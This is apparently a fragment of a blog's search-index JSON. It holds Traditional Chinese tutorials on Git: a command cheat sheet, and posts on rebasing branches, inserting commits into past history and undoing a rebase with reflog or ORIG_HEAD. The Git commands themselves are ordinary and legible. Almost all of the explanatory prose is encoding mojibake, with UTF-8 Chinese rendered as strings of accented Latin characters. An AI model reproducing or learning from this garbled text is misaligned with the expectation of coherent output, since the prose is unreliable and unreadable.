å…¥ç‰ˆæœ¬æ§åˆ¶èˆ‡æäº¤çš„å‹•ä½œã€‚ä½†è¦æ³¨æ„ï¼Œé€™ä¸é©ç”¨æ–¼ã€Œæ–°å»ºç«‹çš„æª”æ¡ˆã€ï¼Œæ›å¥è©±èªªå°±æ˜¯ã€Œåªæœ‰è¢«æ›´æ”¹æˆ–åˆªé™¤çš„æª”æ¡ˆã€æ‰é©ç”¨ï¼‰ git restoreï¼Œä¸è¦ä¿ç•™æ›´æ–°çš„å…§å®¹ git logï¼ŒæŸ¥çœ‹æ­·å²ç´€éŒ„ï¼ˆä½ å»ºç«‹äº†å¹¾å€‹ç‰ˆæœ¬ï¼‰git log --onelineï¼Œæ¯”è¼ƒç°¡çŸ­çš„è³‡è¨Šï¼ˆå…§å®¹å¤ªé•·æœƒè¢« terminal è…°æ–¬ï¼‰ git reflog æŸ¥çœ‹ HEAD ç¶“éçš„æ¯å€‹ç‰ˆæœ¬ï¼Œå¯ä»¥åˆ©ç”¨é€™å€‹ä¾†æŸ¥è©¢æ‰€æœ‰çš„ commit ç´€éŒ„ï¼ˆHEAD åªè¦èµ°éï¼Œå¿…ç•™ç—•è·¡ï¼‰git reflog --grep-reflog=&lt;patter&gt; ç”¨é—œéµå­—ä¾†æœå°‹ git checkoutï¼Œå›åˆ°æŸä¸€å€‹ç‰ˆæœ¬ï¼ˆåˆ‡æ›åˆ°æŸå€‹è³‡æ–™å¤¾ï¼‰ã€‚è¦åˆ‡æ›ç‰ˆæœ¬æ™‚ï¼Œå¯ä»¥æŒ‡å®šæ¯å€‹ç‰ˆæœ¬è™Ÿç¢¼çš„å‰ 7 ç¢¼å°±è¡Œäº†ï¼ˆå› ç‚ºä¹Ÿå¾ˆé›£é‡è¤‡ï¼‰ git checkout masterï¼Œå›åˆ° master é€™å€‹åˆ†æ”¯çš„æœ€æ–°ç‰ˆæœ¬ï¼ˆæ³¨æ„æ˜¯ master é€™å€‹åˆ†æ”¯çš„æœ€æ–°ç‰ˆï¼‰ git diffï¼Œçœ‹é€™ä¸€æ¬¡è·Ÿä¸Šä¸€æ¬¡çš„å·®åˆ¥ã€‚å¦‚æœæ²’æœ‰æŒ‡å®šæª”æ¡ˆçš„è©±æœƒé¡¯ç¤ºæ‰€æœ‰è¢«æ›´æ–°çš„æª”æ¡ˆï¼ˆæ³¨æ„ï¼Œåªæœ‰ã€Œåœ¨ commit ä¹‹å‰ã€æ‰å¯ä»¥æŸ¥çœ‹ã€‚ï¼‰ åˆ†æ”¯æŒ‡ä»¤git branch -vï¼ŒæŸ¥çœ‹ç›®å‰ Git ä¸­çš„æ‰€æœ‰åˆ†æ”¯ï¼Œåƒæ•¸ -v æ˜¯é™„ä¸Šæ¯æ¢åˆ†æ”¯çš„ HEAD æ‰€åœ¨ç‰ˆæœ¬ git branch &lt;branch-name&gt;ï¼Œå»ºç«‹æ–°çš„åˆ†æ”¯ git branch -d &lt;branch-name&gt;ï¼Œåˆªé™¤åˆ†æ”¯ git branch -m &lt;new-name&gt; æ›´æ–°åˆ†æ”¯åç¨± git checkout &lt;branch-name&gt;ï¼Œåˆ‡æ›åˆ°å“ªå€‹åˆ†æ”¯ï¼ˆå°±è·Ÿåˆ‡æ› commit ç‰ˆæœ¬çš„æ¦‚å¿µä¸€æ¨£ï¼‰ git checkout -b &lt;branch-name&gt; å»ºç«‹åˆ†æ”¯å¾Œç›´æ¥åˆ‡æ›éå» git merge &lt;branch-name&gt;ï¼ŒæŠŠ xx åˆ†æ”¯ã€Œåˆä½µé€²ä¾†ã€ã€‚ é—œæ–¼åˆä½µçš„è§€å¿µåšå€‹è£œå……ã€‚å¦‚æœå–®çœ‹åˆä½µé€™å€‹å­—ï¼Œä½ å¯èƒ½æœƒæä¸å¤ªæ¸…æ¥šæ„æ€ã€‚ å‡è¨­ç¾åœ¨æœ‰å…©å€‹åˆ†æ”¯ï¼Œmaster è·Ÿ new-featureï¼Œè€Œä½ äººåœ¨ master åˆ†æ”¯ä¸Šã€‚é‚£åˆä½µå¯èƒ½æœƒæœ‰å…©ç¨®æƒ…æ³ï¼š æŠŠ masterã€Œåˆä½µå‡ºå»ã€ æŠŠ new-featureã€Œåˆä½µé€²ä¾†ã€ è€Œ git merge å¯¦éš›ä¸Šæ˜¯æ¡ç”¨ç¬¬äºŒç¨®ä½œæ³•ï¼Œä¹Ÿå°±æ˜¯ã€Œåˆä½µé€²ä¾†ã€ï¼Œæ‰€ä»¥ master æœƒæŠŠ new-feature åˆä½µé€²ä¾†ã€‚ é€²éšæŒ‡ä»¤git merge &lt;branch&gt; åˆä½µåˆ†æ”¯ git rebase &lt;base&gt; &lt;merged branch&gt; åˆä½µ git rebase -i &lt;åŸºæº–é»&gt; ä½¿ç”¨äº’å‹•æ¨¡å¼ä¾†æ›´æ”¹æ­·å²ç´€é­¯ é ç«¯æŒ‡ä»¤git remote add origin https://github.com/ï¼Œæ–°å¢é ç«¯çš„ repositoryï¼Œé€™é‚Šæ˜¯å»ºä¸€å€‹å«åšã€Œoriginã€çš„é ç«¯ï¼ˆä½ ä¹Ÿå¯ä»¥å–å…¶å®ƒåå­—ï¼Œä½†æ˜¯ç°¡å–®çš„äº‹æƒ…ï¼Œä¸è¦æå¾—å¤ªè¤‡é›œï¼‰ã€‚ è‡³æ–¼é€£çµçš„éƒ¨åˆ†æ˜¯ç”¨ä¾†è¡¨ç¤º origin é€™å€‹é ç«¯ repository çš„ã€Œä½ç½®ã€ï¼ˆç•¢ç«Ÿå®ƒä¸æ˜¯ä½ æœ¬æ©Ÿçš„æ±è¥¿ï¼Œæ‰€ä»¥ä½ ç¸½è¦å‘Šè¨´ Git ä½ è¦æŠŠå®ƒæ”¾åœ¨å“ªè£¡å§ï¼‰ã€‚ git push origin masterï¼ŒæŠŠã€Œæœ¬åœ°ç«¯ã€çš„ master æ¨åˆ° origin ä¸Šä¸¦å»ºç«‹ master åˆ†æ”¯ï¼ˆé ç«¯ï¼‰git push origin master:catï¼ŒæŠŠã€Œæœ¬åœ°ç«¯ã€çš„ master æ¨åˆ° origin ä¸¦å»ºç«‹ cat åˆ†æ”¯ï¼ˆé ç«¯ï¼‰git push orign :cat æŠŠã€Œé ç«¯ã€çš„ cat åˆ†æ”¯ç§»é™¤ git pull origin masterï¼ŒæŠŠã€Œoriginã€çš„ master æ‹‰ä¸‹ä¾†ï¼Œè·Ÿç›®å‰æˆ‘æ‰€åœ¨çš„åˆ†æ”¯å…§å®¹åŒæ­¥ é—œæ–¼ push è·Ÿ pull è¦æ³¨æ„å…©ä»¶äº‹ï¼š ææ¸…æ¥š push è·Ÿ pull çš„å·®åˆ¥ï¼š push çš„ master æ˜¯æŒ‡ã€Œæœ¬åœ°ç«¯çš„ masterã€ï¼Œpull çš„ master æ˜¯æŒ‡ã€Œé ç«¯çš„ masterã€ å¦‚æœ pull ä¸‹ä¾†çš„æª”æ¡ˆè·Ÿæœ¬åœ°çš„æª”æ¡ˆæœ‰ä¿®æ”¹åˆ°åŒæ¨£çš„å…§å®¹ï¼Œé‚£ä¹Ÿæœƒç™¼ç”Ÿ Conflictã€‚ï¼ˆå¯ä»¥æŠŠ pull æƒ³æˆæ˜¯æŠŠé ç«¯çš„ master è·Ÿæœ¬åœ°çš„ master åšåˆä½µï¼Œæåˆ°åˆä½µï¼Œå°±æœƒæœ‰å¯èƒ½å¼•ç™¼ Conflictï¼‰ push å¯ä»¥æŒ‡å®šä½ è¦ push å“ªä¸€å€‹åˆ†æ”¯åˆ°é ç«¯ï¼Œæ‰€ä»¥ä½ ä¸ä¸€å®šè¦åœ¨é‚£å€‹åˆ†æ”¯ä¸Šæ‰èƒ½ pushï¼Œä½†æ˜¯ pull ä¸€å®šè¦åœ¨ä½ è¦åŒæ­¥çš„é‚£å€‹åˆ†æ”¯ä¸Šã€‚ åƒè€ƒè³‡æ–™Git æ•™å­¸ï¼šå¦‚ä½• Push ä¸Šå‚³åˆ° GitHubï¼Ÿé€£çŒ´å­éƒ½èƒ½æ‡‚çš„ Git å…¥é–€æŒ‡å—","link":"/2021/12/13/git-instruction/"},{"title":"Git Rebaseï¼åœ¨éå»çš„ commit ä¸­æ’å…¥æ–°çš„ commit","text":"åƒåœ¨æ”¹å¯«æ­·å²ä¸€æ¨£ã€‚ ç°¡è¿°å‡è¨­é€™æ˜¯ç›®å‰çš„ç´€éŒ„ï¼š é™„è¨»ï¼šé€™é‚Šæ˜¯æ•…æ„ç”¨æ¯”è¼ƒè¤‡é›œçš„ç´€éŒ„ä¾†ç•¶ç¯„ä¾‹ï¼Œå¾Œé¢æœƒè§£é‡‹åŸå› ã€‚ ç¾åœ¨æˆ‘æƒ³è¦åœ¨ B å’Œ C ä¹‹é–“æ’å…¥æ–°çš„ commit ç´€éŒ„ï¼Œé‚£ä¸€æ¨£å¯ä»¥ç”¨ rebase çš„æ–¹å¼ä¾†åšï¼Œä½œæ³•æœƒè·Ÿ Git Rebaseï¼æŠŠå–®å€‹ commit æ‹†æˆå¤šå€‹ commit æœ‰é»é¡ä¼¼ï¼Œæµç¨‹æœƒæ˜¯ï¼š ä½¿ç”¨ rebase edit åŠŸèƒ½ä¾†åœç•™åœ¨ B é€™å€‹ç´€éŒ„é» æ¥è‘—æ”¹å¯« B ä»¥å¾Œçš„ commit ç´€éŒ„ åŸæœ¬æ‹† commit æ™‚æ˜¯æ”¹å¯« B è‡ªå·±çš„ç´€éŒ„ï¼Œç¾åœ¨åªæ˜¯æ”¹æˆåœ¨ B ä»¥å¾Œæ–°å¢å…¶ä»–ç­†ç´€éŒ„è€Œå·²ï¼Œæ‰€ä»¥æ¥è‘—ä¾†ç›´æ¥ä¸‹æŒ‡ä»¤å§ï¼ 1git rebase -i HEAD~7 // é€²å…¥ HEAD ~ ç¬¬ä¸€å€‹ commit ä½ç½®çš„ rebase é€²å…¥äº’å‹•æ¨¡å¼ï¼ŒæŠŠ B è¨­ç‚º editï¼š å­˜æª”ä»¥å¾Œé›¢é–‹ï¼ŒGit å°±æœƒè‡ªå‹•åœåœ¨ B çš„ç´€éŒ„é»ï¼š 123456789pick e4359cf Fåœæ­¢åœ¨ 9451156... Bæ‚¨ç¾åœ¨å¯ä»¥ä¿®è£œé€™å€‹æäº¤ï¼Œä½¿ç”¨ git commit --amend dc4737 åˆ° 6ea94baï¼ˆ7 å€‹æäº¤ï¼‰#ç•¶æ‚¨å°è®Šæ›´æ„Ÿåˆ°æ»¿æ„ï¼ŒåŸ·è¡Œ# p, pick &lt;æäº¤&gt; = ä½¿ç”¨æäº¤ git rebase --continueç”¨æäº¤ï¼Œä½†ç·¨è¼¯æäº¤èªªæ˜ é€™æ™‚å€™å°±å¯ä»¥åœ¨é€™è£¡å»ºç«‹å…¶ä»–çš„ commit ç´€éŒ„ï¼š 12git commit -am 'other1' // ç¬¬ä¸€ç­†æ–°çš„ commitgit commit -am 'other2' // ç¬¬äºŒç­†æ–°çš„ commit æ–°å¢å®Œçš„ç‹€æ…‹æœƒåƒé€™æ¨£ï¼š é›–ç„¶ç›®å‰çœ‹èµ·ä¾†æœ‰é»äº‚ï¼Œä¸éç­‰ä¸€ä¸‹å®Œæˆå¾Œå°±æœƒæ¯”è¼ƒæ­£å¸¸äº†ã€‚ çµæŸ rebaseï¼š 1git rebase --continue é™„è¨»ï¼šå› ç‚ºæ˜¯æ”¹å¯«ä»¥å‰çš„ç´€éŒ„ï¼Œæ‰€ä»¥é€™é‚Šæœ‰å¾ˆå¤§çš„æ©Ÿç‡æœƒå‡ºç¾ conflictï¼Œé€™éƒ¨åˆ†åœ¨è‡ªè¡Œè™•ç†æ‰å³å¯ã€‚ å®Œæˆå¾Œçš„çµæœå¦‚ä¸‹ï¼š å› ç‚ºé€™é‚Šæ¯”è¼ƒäº‚æ‰€ä»¥æœ‰ç‰¹åˆ¥æ¡†èµ·ä¾†æ¨™æ³¨ï¼Œå¯ä»¥çœ‹åˆ° master ä¸Šï¼ˆç²‰è‰²æ¡†æ¡†ï¼‰çš„ç´€éŒ„åœ¨ B ä»¥å¾Œå¤šäº† other1 å’Œ other2 çš„æ–°ç´€éŒ„ï¼ˆç´…è‰²æ¡†æ¡†ï¼‰ï¼Œå°±è·Ÿæˆ‘å€‘æƒ³è¦çš„çµæœæ˜¯ä¸€æ¨£çš„ã€‚ è€Œé€™é‚Šæ•…æ„ç”¨äº†ä¸€å€‹æ¯”è¼ƒè¤‡é›œçš„ç¯„ä¾‹æ˜¯æœ‰åŸå› çš„ï¼Œæˆ‘æƒ³è®“ä½ æ˜ç™½å¦‚æœå»æ”¹å¯«å‰é¢çš„ç´€éŒ„ï¼Œæœƒå°å…¶ä»–çš„åˆ†æ”¯é€ æˆä»€éº¼å½±éŸ¿ï¼Ÿ ä»”ç´°æƒ³æƒ³çœ‹æˆ‘å€‘å‰›å‰›çš„è¡Œç‚ºï¼Œå¦‚æœæˆ‘å€‘çœŸçš„æ”¹å¯«äº†éå»ï¼Œé‚£ç›´è¦ºä¾†èªªä¹Ÿæœƒå½±éŸ¿åˆ° cat å’Œ dog é€™å…©å€‹å¾ master é•·å‡ºå»çš„åˆ†æ”¯ã€‚ å¯æ˜¯å¦‚æœçœŸçš„æ˜¯é€™æ¨£çš„è©±æœƒæœ‰é»å›°æ“¾ï¼Œå°±è·Ÿè´è¶æ•ˆæ‡‰ä¸€æ¨£ï¼Œæ”¹äº† A å°±é€£å¸¶å½±éŸ¿åˆ° B ã€‚æ‰€ä»¥ Git å¾ˆè°æ˜ï¼Œå®ƒæœƒè®“åŸæœ¬çš„åˆ†æ”¯ç¹¼çºŒåœç•™åœ¨åŸæœ¬çš„æ­·å²ç´€éŒ„ï¼Œè€Œä¸æœƒç›´æ¥æ”¾åˆ°æ–°æ­·å²ç´€éŒ„ä¸Šã€‚ æ›å¥è©±èªªå°±æ˜¯ç•¶ä½ åˆ‡æ›åˆ° cat æˆ– dog æ™‚æ˜¯ä¸æœƒçœ‹åˆ° other1 å’Œ other2 é€™å€‹ç´€éŒ„çš„ã€‚ ç¸½ä¹‹é€™å°±æ˜¯å›åˆ°éå»æ–°å¢ commit çš„æ–¹å¼ï¼Œç›¸ä¿¡æˆ‘åœ¨æœªä¾†çš„æŸäº›å ´æ™¯ä¸‹æœƒç”¨åˆ°é€™å€‹åŠŸèƒ½ã€‚","link":"/2022/10/10/git-rebase-insert-commit/"},{"title":"Git Rebaseï¼ä»¥å‰åšäº†ä¸€é»ä¿®æ”¹ï¼Œæƒ³åˆä½µåˆ°ç›®å‰çš„ç´€éŒ„","text":"å·¥ä½œæ™‚ç¢°åˆ°çš„ç‹€æ³ã€‚ ç°¡è¿°é€™æ˜¯æˆ‘åœ¨å·¥ä½œæ™‚ç¢°åˆ°çš„ä¸€å€‹å•é¡Œï¼Œå°±æ˜¯æˆ‘ç¿’æ…£åœ¨å®Œæˆç›®å‰é€²åº¦ä»¥å¾Œå›é ­å»é‡æ§‹ä¸€äº›ä»¥å‰çš„ codeã€‚é€™ä»¶äº‹æœ¬èº«æ²’ä»€éº¼å•é¡Œï¼Œæœ‰å•é¡Œçš„åœ°æ–¹æ˜¯ï¼š æœ‰æ™‚å¾Œé‡æ§‹çš„éƒ¨åˆ†åªå®Œæˆäº†ä¸€åŠï¼Œæ‰€ä»¥ä¸æƒ³è¦ç›´æ¥åˆä½µåˆ°ç›®å‰çš„é€²åº¦è£¡ä¸¦æ¨åˆ°é ç«¯ä¸Šã€‚ é€™æ™‚å€™å°±æœƒç”¢ç”Ÿé€™æ¨£çš„ç´€éŒ„ï¼š å‡è¨­æˆ‘åŸæœ¬åœ¨ E çš„æ™‚å€™é‡æ§‹äº†ä¸€éƒ¨åˆ†çš„ codeï¼Œä½†ç•¶æ™‚æ²’æœ‰é‚„æäº¤ä¸Šå»ï¼Œæ‰€ä»¥é€™ä¸€æ®µé€²åº¦å°±æœƒåœç•™åœ¨èˆŠçš„æ­·å²ç´€éŒ„ä¸Šã€‚ æ¥è‘—åˆ°æˆ‘ä¸‹æ¬¡å®Œæˆé€²åº¦ï¼ˆå‡è¨­æ˜¯ catï¼‰ç¹¼çºŒé‡æ§‹ä»¥å¾Œï¼Œç”¨ merge ä¾†åˆä½µåˆ°ç›®å‰çš„é€²åº¦æ™‚å°±æœƒè®Šæˆé€™æ¨£å­ï¼š è€å¯¦èªªå°±é€™æ¨£ç›´æ¥æ¨åˆ°é ç«¯ä¸Šä¹Ÿæ²’ä»€éº¼å•é¡Œï¼Œåªæ˜¯å¦‚æœä½ è·Ÿæˆ‘ä¸€æ¨£æœ‰ä¸€é»ã€Œæ½”ç™–ã€çš„è©±ï¼Œæ‡‰è©²æœƒè¦ºå¾—èƒ½ç”¨æ›´å„ªé›…çš„æ–¹å¼ä¾†è™•ç†å¹¾å€‹å•é¡Œï¼š reconstruct ä¸Šçš„ commit ç´€éŒ„æ‡‰è©²èƒ½åˆä½µæˆä¸€ç­†ï¼ˆç•¢ç«Ÿ partial change é€™å€‹ commit åªæ˜¯ç•¶æ™‚ç”¨ä¾†æš«å­˜çš„æ®µè½ï¼Œä¸ç„¶å®ƒæœ¬èº«æ²’æœ‰å¯¦éš›æ„ç¾©ï¼‰ reconstruct å¯ä»¥ç›´æ¥ç”¨ rebase æ¥åˆ° cat å¾Œé¢ï¼Œå°±ä¸æœƒçœ‹èµ·ä¾†æ‹‰äº†ä¸€æ¢å¾ˆé•·çš„ç·šå‡ºä¾†ï¼ˆé€™å€‹å®Œå…¨æ˜¯å–œå¥½å•é¡Œ XDï¼‰ æ‰€ä»¥ä¾†é‡é ­é–‹å§‹å§ï¼ å…ˆä¾†æ”¹å¯« reconstruct çš„ commit ç´€éŒ„ï¼š 12git reset HEAD~2 // æ”¶å›æ‰€æœ‰çš„ commitgit commit -am 'reconstruct code' // é‡æ–°å»ºç«‹ commit ç´€éŒ„ æ¥è‘—ç”¨ rebase æŠŠ reconstruct æ¥åˆ° cat å¾Œé¢ï¼š 1git rebase cat reconstruct é™„è¨»ï¼šå¦‚æœçœ‹ä¸æ‡‚é€™æ®µæŒ‡ä»¤çš„è©±å¯ä»¥å»è¤‡ç¿’ Git Rebaseï¼åˆä½µåˆ†æ”¯ æœ€å¾Œå°±å¾—åˆ°äº†ä¸€å€‹ä¹¾æ·¨è¨±å¤šçš„æ–°ç´€éŒ„ï¼š ç¸½è€Œè¨€ä¹‹ï¼Œä¸ç®¡æƒ³ç”¨ merge é‚„æ˜¯ rebase ä¾†åˆä½µéƒ½å¯ä»¥ï¼Œå› ç‚ºæœ€å¾Œä½µå‡ºä¾†çš„å…§å®¹éƒ½æ˜¯ç›¸åŒçš„ï¼Œä¸»è¦åªæ˜¯å·®åœ¨æ­·å²ç´€éŒ„çœ‹èµ·ä¾†ä¸å¤ªä¸€æ¨£ï¼Œä¸éæˆ‘å€‹äººé‚„æ˜¯åå¥½ rebase çš„æ–¹å¼å°±æ˜¯äº†ã€‚","link":"/2022/10/13/git-rebase-merge-previous-change/"},{"title":"Git Rebaseï¼åˆä½µåˆ†æ”¯","text":"å­¸æœƒä»¥å¾Œæœƒè¦ºå¾—å®ƒå¾ˆå¥½ç”¨ã€‚ ç°¡è¿°åœ¨ä½¿ç”¨ rebase ä»¥å‰æˆ‘å€‘å…ˆä¾†çœ‹ä¸€ä¸‹ä¸€èˆ¬çš„ merge æ˜¯æ€éº¼ä½µçš„ã€‚ å‡è¨­ç›®å‰çš„ç´€éŒ„é•·é€™æ¨£ï¼š æ¥è‘—æˆ‘å€‘åœ¨ cat åˆ†æ”¯åŸ·è¡Œï¼š 1git merge dog // æŠŠ dog åˆä½µåˆ° cat è§£é™¤å®Œ conflictï¼ˆå¦‚æœæœ‰ï¼‰ä»¥å¾Œçš„çµæœå¦‚ä¸‹ï¼š å¥½ï¼Œé€™å°±æ˜¯æˆ‘å€‘ç†ŸçŸ¥çš„ mergeï¼Œä½†ç‚ºä»€éº¼è¦ç‰¹åˆ¥æé€™å€‹ï¼Ÿé€™æ˜¯å› ç‚ºç­‰ä¸€ä¸‹è¦ä»‹ç´¹çš„ rebase åˆä½µå®Œçš„çµæœæœƒè·Ÿç¾åœ¨ä¸å¤ªä¸€æ¨£ã€‚ ç¾åœ¨è®“æˆ‘å€‘æ”¹ç”¨ rebase ä¾†åˆä½µå‰›å‰›çš„ cat å’Œ dog åˆ†æ”¯ï¼ˆä¸€æ¨£æ˜¯åœ¨ cat åˆ†æ”¯ï¼‰ï¼š 1git rebase dog cat é€™æ®µæŒ‡ä»¤çš„æ„æ€æ˜¯ git rebase &lt;åŸºæº–é»&gt; &lt;è¢«è¤‡è£½çš„äºº&gt;ï¼Œä¸éä½ æ‡‰è©²æ¯”è¼ƒå¸¸çœ‹åˆ° git rebase dog çš„å¯«æ³•ï¼Œå› ç‚º git æœƒæŠŠ &lt;è¢«è¤‡è£½çš„äºº&gt; è‡ªå‹•å¸¶å…¥ç›®å‰æ‰€åœ¨çš„åˆ†æ”¯ã€‚ è‡³æ–¼ &lt;åŸºæº–é»&gt; è·Ÿ &lt;è¢«è¤‡è£½çš„äºº&gt; æ˜¯ä»€éº¼æ„æ€å¾…æœƒå†è§£é‡‹ï¼Œæˆ‘å€‘å…ˆçœ‹ä¸€ä¸‹ rebase å¾Œçš„çµæœæœƒé•·ä»€éº¼æ¨£ï¼š åœ¨ merge çš„æ™‚å€™æœƒè‡ªå‹•å¹«æˆ‘å€‘ç”¢ç”Ÿä¸€å€‹æ–°çš„ commit ä¾†è¡¨ç¤ºã€Œåˆä½µã€é€™ä»¶äº‹ï¼Œå¯æ˜¯åœ¨ rebase çš„æ™‚å€™å°±æ²’æœ‰é€™å€‹è¡Œç‚ºäº†ï¼Œçœ‹èµ·ä¾†å°±å¥½åƒç›´æ¥ã€ŒæŠŠ cat æ¥åˆ° dog ä¸Šé¢ä¸€æ¨£ã€çš„æ„Ÿè¦ºã€‚ é™¤äº†æœ€å¾Œçš„çµæœé•·çš„ä¸å¤ªä¸€æ¨£ä»¥å¤–ï¼Œã€Œåˆä½µã€é€™ä»¶äº‹æœ¬èº«æ˜¯ç›¸åŒçš„ï¼Œæ‰€ä»¥è¦ç”¨å“ªä¸€ç¨®æ–¹å¼ä¾†åˆä½µéƒ½æ˜¯å¯ä»¥çš„ã€‚ rebase èƒŒå¾Œåšäº†ä»€éº¼ï¼Ÿå‰é¢æœ‰æåˆ°åœ¨ä½¿ç”¨ rebase æŒ‡ä»¤æ™‚æœƒè¨­å®š &lt;åŸºæº–é»&gt; å’Œ &lt;è¢«è¤‡è£½çš„äºº&gt; é€™å…©å€‹ä¸åŒçš„ã€Œå°è±¡ã€ï¼Œæ‰€ä»¥é€™åˆ°åº•æ˜¯ä»€éº¼ï¼Ÿ ç°¡å–®ä¾†èªªï¼Œå›æ†¶ä¸€ä¸‹å‰›å‰›çš„ä¾‹å­ï¼Œæˆ‘å€‘åœ¨ç”¨ rebase åšåˆä½µæ™‚å¤§æ¦‚åšäº†é€™å¹¾ä»¶äº‹ï¼š è¤‡è£½ä¸€ä»½ cat èº«ä¸Šçš„ commit ç´€éŒ„ï¼ˆå»ºç«‹æ–°çš„ hash å€¼ï¼‰ æŠŠè¤‡è£½éä¾†çš„ç´€éŒ„ã€Œæ¥ã€åˆ° dog çš„æœ€å¾Œä¸€ç­† commit ä¸Š å®Œæˆ rebase å› ç‚ºæœƒæœ‰ã€Œè¤‡è£½ã€é€™å€‹å‹•ä½œï¼Œæ‰€ä»¥ &lt;è¢«è¤‡è£½çš„äºº&gt; å°±æ˜¯åœ¨æŒ‡ä½ è¦è¤‡è£½å“ªä¸€å€‹åˆ†æ”¯çš„ commit ç´€éŒ„ï¼Ÿè€Œè¤‡è£½å®Œä»¥å¾Œè¦å†ã€Œæ¥åˆ°æŸå€‹åˆ†æ”¯ä¸Šã€ï¼Œæ‰€ä»¥ &lt;åŸºæº–é»&gt; å°±æ˜¯åœ¨æŒ‡è¦è¢«æ¥ä¸Šå»çš„é‚£å€‹åˆ†æ”¯æ˜¯èª°ï¼Ÿ é€™å€‹æ˜¯æˆ‘è‡ªå·±çš„ç†è§£æ–¹å¼ï¼Œå¦‚æœè¦çœ‹æ›´è©³ç´°çš„èªªæ˜å¯ä»¥çœ‹é€™ç¯‡ã€‚ æ‰€ä»¥å‰›å‰›çš„ç¯„ä¾‹å¦‚æœæ”¹æˆï¼š 1git rebase cat dog å‡ºä¾†çš„çµæœå°±æœƒè®Šæˆï¼š å› ç‚º &lt;åŸºæº–é»&gt; å’Œ &lt;è¢«è¤‡è£½çš„äºº&gt; äº¤æ›äº†ï¼Œæ‰€ä»¥å‡ºä¾†çš„çµæœä¹Ÿæœƒä¸ä¸€æ¨£ï¼Œæ‰€ä»¥æˆ‘è¦ºå¾—åœ¨ä½¿ç”¨ rebase çš„æ™‚å€™åªè¦ææ¸…æ¥šé€™å…©å€‹è§’è‰²å°±ä¸æœƒæœ‰å¤ªå¤šç–‘æƒ‘äº†ã€‚ é †é“ä¸€æï¼Œé€™å…©å€‹è©åªæ˜¯æˆ‘è‡ªå·±ç™¼æ˜çš„ï¼Œå¦‚æœå‡ºå»å¤–é¢é€™æ¨£è·Ÿåˆ¥äººèªªçš„è©±åˆ¥äººå¯èƒ½æœƒæ»¿è‡‰å•è™Ÿã€‚ æ€éº¼å–æ¶ˆ rebase å¾Œçš„çµæœä¸€æ¨£æ˜¯å‰›å‰›çš„ç¯„ä¾‹ï¼Œå‡è¨­é€™æ˜¯ rebase å¾Œçš„çµæœï¼š ç¾åœ¨æœƒç¢°åˆ°çš„å•é¡Œæ˜¯ï¼Œå¦‚æœæƒ³è¦è·³å›ã€Œé‚„æ²’æœ‰ rebase å‰ã€çš„ç‹€æ…‹è©²æ€éº¼åšï¼Ÿä½ å¯èƒ½æœƒæƒ³èªªï¼š å•Šå°±ç›´æ¥ç”¨ reset HEAD^ --hard ä¸è¡Œå—ï¼Ÿã€ ç­”æ¡ˆæ˜¯ä¸è¡Œï¼Œé€™æ¨£å­åªæœƒå›åˆ°å‰ä¸€å€‹ commit ç´€éŒ„è€Œå·²ï¼š é€™æ˜¯å› ç‚º rebase ä¸åƒ merge æœƒè‡ªå‹•å¹«æˆ‘å€‘å¦å¤–ç”¢ç”Ÿä¸€å€‹æ–°çš„ commit ç´€éŒ„ï¼Œæ‰€ä»¥ä½ å°±ç®—æƒ³ç”¨ reset å›åˆ°å‰ä¸€ç­†ç´€éŒ„ï¼Œé€™ç­†ç´€éŒ„ä¹Ÿä¸æœƒæ˜¯ã€Œåš rebase ä¹‹å‰ã€çš„é‚£ä¸€ç­†ã€‚ é€™æ™‚å€™æœ‰å…©ç¨®æ–¹æ³•ï¼š ç”¨ reflog æ‰¾åˆ° rebase ä»¥å‰çš„ commit ç´€éŒ„ ç”¨ ORIG_HEAD å›åˆ°ä¸Šä¸€å€‹ã€Œå±éšªæ“ä½œã€ä»¥å‰çš„ä½ç½® é€™é‚Šå…ˆä¾†çœ‹ç¬¬ä¸€ç¨®ï¼Œé¦–å…ˆä¸‹ git reflog ä¾†æŸ¥çœ‹æ­·å²ç´€éŒ„ï¼š é™„è¨»ï¼šé€™é‚Šæˆ‘æœ‰é‡å¯«éç´€éŒ„ï¼Œæ‰€ä»¥æ‰ä¸æœƒæœ‰å‰›å‰›çš„ reset ç´€éŒ„ ç´…è‰²æ¡†èµ·ä¾†çš„éƒ¨åˆ†éƒ½æ˜¯è·Ÿ rebase ç›¸é—œçš„æ“ä½œï¼Œæ‰€ä»¥æˆ‘å€‘åªè¦å›åˆ°é€™ä¹‹å‰çš„ç´€éŒ„å°±è¡Œäº†ã€‚ æ’‡é™¤æ‰ rebase å¾Œçš„æœ€æ–°ç´€éŒ„æ˜¯ add cat2ï¼ˆ138f72cï¼‰ï¼Œé€™å€‹å°±æ˜¯æˆ‘å€‘è¦çš„äº†ï¼Œæ‰€ä»¥å¯ä»¥ä¸‹ï¼š 1git reset 138f72c --hard é€™æ¨£å­å°±èƒ½å›åˆ° rebase å‰çš„ç‹€æ…‹å›‰ï¼š æ¥è‘—æ˜¯ç¬¬äºŒç¨®æ–¹å¼ï¼Œé€™å€‹åªè¦ç›´æ¥ä¸‹ï¼š 1git reset ORIG_HEAD --hard ä¸€æ¨£ä¹Ÿèƒ½å›åˆ° rebase å‰çš„ç‹€æ…‹ï¼š å¾ˆç¥å¥‡å§ï¼é€™æ˜¯å› ç‚º ORIG_HEAD æ˜¯ Git ä¸­æ¯”è¼ƒç‰¹åˆ¥çš„ç´€éŒ„é»ï¼Œå®ƒæœƒè‡ªå‹•è¨˜ä½ä¸Šä¸€æ¬¡ã€Œåˆä½µåˆ†æ”¯ã€ã€ã€ŒResetã€æˆ–æ˜¯ã€ŒRebaseã€é€™äº›æ¯”è¼ƒå±éšªçš„æ“ä½œï¼Œä¹Ÿå› ç‚ºé€™æ¨£æ‰€ä»¥æ‰æœƒç¨±ç‚ºã€Œå±éšªæ“ä½œã€ï¼Œæ‰€ä»¥å¦‚æœä½ æ‡¶çš„ç”¨ reflog å»æŸ¥ hash å€¼çš„è©±å°±å¯ä»¥ç›´æ¥ç”¨é€™å€‹æ–¹å¼ä¾† resetï¼Œæœƒæ›´æ–¹ä¾¿ä¸€äº›ã€‚ ç¸½ä¹‹é€™å…©ç¨®æ–¹æ³•éƒ½æ˜¯ OK çš„ï¼ŒæŒ‘ä¸€å€‹ä½ å–œæ­¡çš„ä¾†ç”¨å°±è¡Œäº†ã€‚","link":"/2022/10/05/git-rebase-merge/"},{"title":"Git Rebaseï¼æŠŠå–®å€‹ commit æ‹†æˆå¤šå€‹ commit","text":"ä¹Ÿè¨±æœ‰å¤©æœƒç”¨åˆ°é€™å€‹åŠŸèƒ½ã€‚ 